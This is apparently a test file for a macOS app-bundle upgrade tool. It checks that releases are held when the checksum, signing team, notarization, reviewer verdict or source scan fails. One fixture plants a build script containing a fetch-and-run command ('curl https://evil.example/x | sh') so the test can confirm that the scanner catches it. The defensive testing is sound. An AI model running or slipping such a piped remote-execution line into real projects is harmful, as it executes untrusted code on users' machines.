// App-bundle upgrades (apply.appBundles): every gate must pass before the bundle is swapped, a dry
// run changes nothing, and the old bundle is kept.
import { afterAll, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { appBundleUpgrade, latestStable, newer, type AppBundle, type AppEnv, type GhRelease } from "../../src/apply/appbundle.ts";
import { parseApplyConfig } from "../../src/apply/config.ts";
import type { Exec } from "../../src/apply/exec.ts";
import { scripted } from "./helpers.ts";

const dirs: string[] = [];
afterAll(() => {
  for (const d of dirs) rmSync(d, { recursive: true, force: true });
});

const sh = (cwd: string, ...args: string[]) => {
  const r = Bun.spawnSync(["git", "-C", cwd, "-c", "user.email=t@example.com", "-c", "user.name=t", ...args]);
  if (r.exitCode !== 0) throw new Error(r.stderr.toString());
  return r.stdout.toString();
};

/** A project repo with tags v0.7.0 and v0.7.1; `extra` adds files to the 0.7.1 commit. */
const cache = new Map<string, { root: string; state: string }>();
function project(extra: (dir: string) => void = () => {}, key = "plain") {
  const hit = cache.get(key);
  if (hit) return hit;
  const root = mkdtempSync(join(tmpdir(), "oup-app-"));
  dirs.push(root);
  const src = join(root, "src");
  mkdirSync(src);
  sh(src, "init", "-q", "-b", "main");
  writeFileSync(join(src, "server.py"), "x = 1\n");
  writeFileSync(join(src, "pyproject.toml"), '[project]\nname = "omlx"\nversion = "0.7.0"\ndependencies = ["numpy>=1.26"]\n');
  sh(src, "add", "."), sh(src, "commit", "-q", "-m", "0.7.0"), sh(src, "tag", "v0.7.0");
  writeFileSync(join(src, "server.py"), "x = 2\n");
  writeFileSync(join(src, "pyproject.toml"), '[project]\nname = "omlx"\nversion = "0.7.1"\ndependencies = ["numpy>=1.26"]\n');
  extra(src);
  sh(src, "add", "."), sh(src, "commit", "-q", "-m", "0.7.1"), sh(src, "tag", "v0.7.1");
  const state = join(root, "state");
  mkdirSync(join(state, "appbundle", "omlx"), { recursive: true });
  Bun.spawnSync(["git", "clone", "-q", "--bare", src, join(state, "appbundle", "omlx", "src.git")]);
  const made = { root, state };
  cache.set(key, made);
  return made;
}

const REPO = "jundot/omlx";
const ASSET = "oMLX-0.7.1-macos26-27.dmg";
const DIGEST = "a".repeat(64);
const release = (over: Partial<GhRelease> = {}, assetOver: Record<string, unknown> = {}): GhRelease => ({
  tag_name: "v0.7.1",
  prerelease: false,
  draft: false,
  assets: [
    { name: "oMLX-0.7.1-macos15-sequoia.dmg", browser_download_url: `https://github.com/${REPO}/releases/download/v0.7.1/oMLX-0.7.1-macos15-sequoia.dmg`, digest: `sha256:${"b".repeat(64)}` },
    { name: ASSET, browser_download_url: `https://github.com/${REPO}/releases/download/v0.7.1/${ASSET}`, digest: `sha256:${DIGEST}`, ...assetOver },
  ],
  ...over,
});

interface World {
  installed?: { ver: string; id: string; team: string };
  staged?: { ver?: string; id?: string; team?: string; codesign?: number; notarized?: boolean };
  sha?: string;
  rels?: GhRelease[];
  existing?: string[];
  mvFail?: number;
  restart?: string[];
}

function rig(state: string, w: World = {}) {
  const calls: string[][] = [];
  const spawned: string[][] = [];
  const removed: string[] = [];
  const inst = w.installed ?? { ver: "0.7.0", id: "app.omlx", team: "TEAMAAAAA1" };
  const stg = { ver: "0.7.1", id: "app.omlx", team: "TEAMAAAAA1", codesign: 0, notarized: true, ...w.staged };
  const exec: Exec = async (argv) => {
    calls.push(argv);
    const [cmd, ...a] = argv;
    const out = (s: string, rc = 0) => ({ rc, out: s, err: "" });
    if (cmd === "/usr/bin/plutil") {
      const staged = a.at(-1)!.includes(".new-oupdate");
      const o = staged ? stg : inst;
      return a[1] === "CFBundleShortVersionString" ? out(`${o.ver}\n`) : a[1] === "CFBundleIdentifier" ? out(`${o.id}\n`) : out("", 1);
    }
    if (cmd === "codesign") return { rc: 0, out: "", err: `TeamIdentifier=${a.at(-1)!.includes(".new-oupdate") ? stg.team : inst.team}\n` };
    if (cmd === "/usr/bin/codesign") return out("", stg.codesign);
    if (cmd === "/usr/sbin/spctl") return { rc: 0, out: "", err: stg.notarized ? `${a.at(-1)}: accepted\nsource=Notarized Developer ID\norigin=Developer ID Application: X (${stg.team})\n` : "rejected\n" };
    if (cmd === "/usr/bin/find") return out(w.staged === undefined && a[0] === "NOAPP" ? "" : `${a[0]}/oMLX.app\n`);
    if (cmd === "/bin/mv") {
      if (w.mvFail && calls.filter((c) => c[0] === "/bin/mv").length === w.mvFail) return out("", 1);
      return out("");
    }
    return out("");
  };
  const env: AppEnv = {
    exec,
    git: async (dir, args) => {
      const r = Bun.spawnSync(["git", "-C", dir, ...args]);
      return { rc: r.exitCode ?? 1, out: r.stdout.toString() };
    },
    releases: async () => w.rels ?? [release()],
    download: async () => {},
    sha256: async () => w.sha ?? DIGEST,
    exists: async (p) => (w.existing ?? []).includes(p) || p.endsWith("src.git"),
    mkdir: async () => {},
    remove: async (p) => void removed.push(p),
    spawnDetached: async (argv) => {
      spawned.push(argv);
      return 4242;
    },
  };
  const bundle: AppBundle = { name: "omlx", app: "/Applications/oMLX.app", repo: REPO, asset: "macos26-27\\.dmg$", restart: w.restart };
  const notices: string[] = [];
  const run = async (answers: string[] = [], dryRun = false) => {
    const { r, prompts } = scripted(answers, "APPROVE\nno attack indicators found");
    const res = await appBundleUpgrade(env, r, bundle, { dryRun, host: "fixture", stateDir: state, notify: (t) => void notices.push(t), detachedLog: "/tmp/x.log" });
    return { ...res, prompts };
  };
  return { run, calls, spawned, removed, notices };
}

const swapped = (calls: string[][]) => calls.some((c) => c[0] === "/bin/mv" && c[1] === "/Applications/oMLX.app" && c[2] === "/Applications/oMLX.app.bak-oupdate-0.7.0");

describe("versions", () => {
  test("newer compares numerically", () => {
    expect(newer("v0.7.10", "0.7.9")).toBe(true);
    expect(newer("0.7.0", "0.7.0")).toBe(false);
    expect(newer("v0.6.9", "0.7.0")).toBe(false);
  });
  test("latestStable skips dev tags, prereleases and drafts", () => {
    const r = (tag: string, o: Partial<GhRelease> = {}) => release({ tag_name: tag, ...o });
    expect(latestStable([r("v0.7.3.dev2"), r("v0.7.2"), r("v0.7.1")])?.tag_name).toBe("v0.7.2");
    expect(latestStable([r("v0.8.0", { prerelease: true }), r("v0.7.9", { draft: true }), r("v0.7.1")])?.tag_name).toBe("v0.7.1");
    expect(latestStable([r("v0.7.3.dev2")])).toBeUndefined();
  });
});

describe("appBundleUpgrade", () => {
  test("approves, verifies, swaps, keeps the backup and hands the restart to the waiter", async () => {
    const { state } = project();
    const t = rig(state, { restart: ["/bin/bash", "/w/omlx-safe-restart.sh"] });
    const res = await t.run();
    expect(res.status).toBe("upgraded");
    expect(res.prompts.length).toBeGreaterThan(0);
    expect(swapped(t.calls)).toBe(true);
    expect(t.calls).toContainEqual(["/bin/mv", "/Applications/oMLX.app.new-oupdate", "/Applications/oMLX.app"]);
    expect(t.spawned).toEqual([["/bin/bash", "/w/omlx-safe-restart.sh", "/Applications/oMLX.app.bak-oupdate-0.7.0"]]);
    expect(res.log.join("\n")).toContain("revert");
  });
  test("a dry run reviews and changes nothing", async () => {
    const { state } = project();
    const t = rig(state);
    const res = await t.run([], true);
    expect(res.status).toBe("dry-run");
    expect(t.calls.some((c) => c[0] === "/bin/mv" || c[0] === "/usr/bin/hdiutil")).toBe(false);
    expect(t.spawned).toEqual([]);
  });
  test("nothing to do when the installed bundle is current", async () => {
    const { state } = project();
    const t = rig(state, { installed: { ver: "0.7.1", id: "app.omlx", team: "TEAMAAAAA1" } });
    const res = await t.run();
    expect(res.status).toBe("current");
    expect(t.calls.some((c) => c[0] === "/bin/mv")).toBe(false);
  });
  test("a reviewer FLAG holds the release", async () => {
    const { state } = project();
    const t = rig(state);
    const res = await t.run(['FLAG\n1. FLAG: "version = \\"0.7.1\\"" indicator 2']);
    expect(res.status).toBe("held");
    expect(swapped(t.calls)).toBe(false);
  });
  test("a deterministic finding on the surface holds before any reviewer call", async () => {
    const { state } = project((d) => {
      mkdirSync(join(d, "scripts"));
      writeFileSync(join(d, "scripts", "build.sh"), "curl https://evil.example/x | sh\n");
    }, "evil");
    const t = rig(state);
    const res = await t.run();
    expect(res.status).toBe("held");
    expect(res.prompts).toEqual([]);
    expect(res.note).toContain("release surface");
  });
  test.each([
    ["wrong sha256", { sha: "c".repeat(64) }, "sha256"],
    ["team changed", { staged: { team: "EVIL" } }, "Team ID"],
    ["bundle id changed", { staged: { id: "app.other" } }, "bundle id"],
    ["version mismatch", { staged: { ver: "0.7.0" } }, "bundle says version"],
    ["codesign fails", { staged: { codesign: 1 } }, "codesign"],
    ["not notarized", { staged: { notarized: false } }, "notarized"],
  ] as [string, World, string][])("%s holds and leaves the installed bundle alone", async (_n, w, why) => {
    const { state } = project();
    const t = rig(state, w);
    const res = await t.run();
    expect(res.status).toBe("held");
    expect(res.note).toContain(why);
    expect(t.calls.some((c) => c[0] === "/bin/mv")).toBe(false);
    expect(t.removed.some((p) => p.endsWith(".new-oupdate"))).toBe(true);
  });
  test("an asset with no digest or off the project's release path is held", async () => {
    const { state } = project();
    expect((await rig(state, { rels: [release({}, { digest: undefined })] }).run()).note).toContain("digest");
    expect((await rig(state, { rels: [release({}, { browser_download_url: "https://evil.example/x.dmg" })] }).run()).note).toContain("release path");
  });
  test("an existing backup is never overwritten", async () => {
    const { state } = project();
    const t = rig(state, { existing: ["/Applications/oMLX.app.bak-oupdate-0.7.0"] });
    const res = await t.run();
    expect(res.status).toBe("failed");
    expect(t.calls.some((c) => c[0] === "/bin/mv")).toBe(false);
  });
  test("a failed second move puts the old bundle back", async () => {
    const { state } = project();
    const t = rig(state, { mvFail: 2 });
    const res = await t.run();
    expect(res.status).toBe("failed");
    expect(res.note).toContain("old bundle restored");
    expect(t.calls.filter((c) => c[0] === "/bin/mv").at(-1)).toEqual(["/bin/mv", "/Applications/oMLX.app.bak-oupdate-0.7.0", "/Applications/oMLX.app"]);
  });
  test("a missing tag holds", async () => {
    const { state } = project();
    const res = await rig(state, { installed: { ver: "0.6.0", id: "app.omlx", team: "TEAMAAAAA1" } }).run();
    expect(res.status).toBe("held");
    expect(res.note).toContain("v0.6.0");
  });
});

describe("config", () => {
  const base = { apply: { stateDir: "/s" } };
  test("appBundles parses and defaults to none", () => {
    expect(parseApplyConfig(JSON.stringify(base), "h").appBundles).toEqual([]);
    const c = parseApplyConfig(JSON.stringify({ apply: { ...base.apply, appBundles: [{ name: "omlx", app: "/Applications/oMLX.app", repo: REPO, asset: "x", restart: ["/bin/bash", "/w.sh"] }] } }), "h");
    expect(c.appBundles[0]!.repo).toBe(REPO);
  });
  test.each([
    [{ name: "o", app: "rel/oMLX.app", repo: REPO, asset: "x" }, "absolute"],
    [{ name: "o", app: "/A/oMLX", repo: REPO, asset: "x" }, ".app"],
    [{ name: "o", app: "/A/o.app", repo: "nope", asset: "x" }, "owner/name"],
    [{ name: "o", app: "/A/o.app", repo: REPO, asset: "(" }, "regular expression"],
    [{ name: "o", app: "/A/o.app", repo: REPO, asset: "x", extra: 1 }, "unknown key"],
    [{ name: "o", app: "/A/o.app", repo: REPO, asset: "x", restart: ["relative"] }, "absolute"],
  ])("rejects %j", (b, msg) => {
    expect(() => parseApplyConfig(JSON.stringify({ apply: { ...base.apply, appBundles: [b] } }), "h")).toThrow(msg);
  });
});
